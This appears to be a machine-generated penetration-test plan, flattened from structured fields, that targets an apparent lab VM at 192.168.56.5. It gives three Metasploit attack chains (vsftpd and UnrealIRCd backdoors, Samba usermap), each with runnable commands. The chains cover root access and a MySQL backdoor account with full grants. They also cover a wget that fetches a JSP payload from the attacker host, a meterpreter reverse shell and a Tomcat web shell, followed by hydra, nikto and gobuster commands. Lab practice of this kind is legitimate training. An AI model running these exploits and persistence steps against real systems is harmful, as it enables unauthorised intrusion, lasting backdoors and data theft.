attack_chains.name: Chain 1: FTP Backdoor to Root Shell

initial_access.description: Exploit vsftpd 2.3.4 backdoor for initial shell access.
commands: msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.56.5; set RPORT 21; run'
verification: Check for open backdoor connection with: nc -zv 192.168.56.5 6200
If successful, interact with shell and run 'id' to confirm user access.

privilege_escalation.description: Backdoor provides root access directly; verify and escalate if needed via kernel exploits.
commands: Within MSF shell: 'whoami' to confirm root; if not, search_sploits -j linux kernel | grep local
verification: Run 'id' in the shell to check privileges; look for uid=0(root).

persistence.description: Add cron job or backdoor for persistence.
verification: Check crontab with 'crontab -l'; test reverse shell from another terminal on Kali: nc -lvp 4444

attack_chains.name: Chain 2: Samba Exploit to Database Access

initial_access.description: Exploit Samba usermap script for command execution and initial foothold.
verification: Post-exploit, run 'ping -c 1 192.168.56.1' from MSF shell to confirm network access.

privilege_escalation.description: Use initial access to enumerate and crack MySQL creds for escalated database privileges.
verification: In MySQL: SHOW GRANTS; to confirm elevated privileges on database.

persistence.description: Create MySQL user with remote access for persistent database backdoor.
commands: In MySQL: CREATE USER 'backdoor'@'%' IDENTIFIED BY 'pass123'; GRANT ALL ON *.* TO 'backdoor'@'%';
verification: From Kali: mysql -h 192.168.56.5 -u backdoor -p; run 'SELECT user();' to confirm access.

attack_chains.name: Chain 3: IRC Backdoor to Web Shell Persistence

initial_access.description: Exploit UnrealIRCd backdoor for remote code execution.
commands: msfconsole -q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 192.168.56.5; set RPORT 6667; run'
verification: Interact with shell and run 'uname -a' to confirm system access.
Telnet to IRC port: telnet 192.168.56.5 6667 and send AB; to trigger backdoor.

privilege_escalation.description: From IRC shell, upload and execute Tomcat manager exploit for web app access.
commands: In shell: wget http://192.168.56.1/tomcat.jsp -O /tmp/tomcat.jsp; then msfconsole for tomcat_mgr_upload
msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS 192.168.56.5; set RPORT 8180; run'
verification: Access web shell: curl http://192.168.56.5:8180/tomcat.jsp?cmd=id; check for root output.

persistence.description: Deploy persistent web shell via Tomcat upload.
commands: Use MSF to upload a JSP shell: set PAYLOAD java/meterpreter/reverse_tcp; set LHOST 192.168.56.1
verification: Browse to uploaded shell path and execute 'whoami'; monitor for Meterpreter session on Kali.

followup_requests: Run detailed Nikto scan on ports 80 and 8180: nikto -h 192.168.56.5 -p 80,8180
Attempt weak credential guessing on SSH (port 22) and VNC (port 5900): hydra -l msfadmin -p msfadmin 192.168.56.5 ssh; vncviewer 192.168.56.5:5900 with password msfadmin
Gobuster directory enumeration on web ports: gobuster dir -u http://192.168.56.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
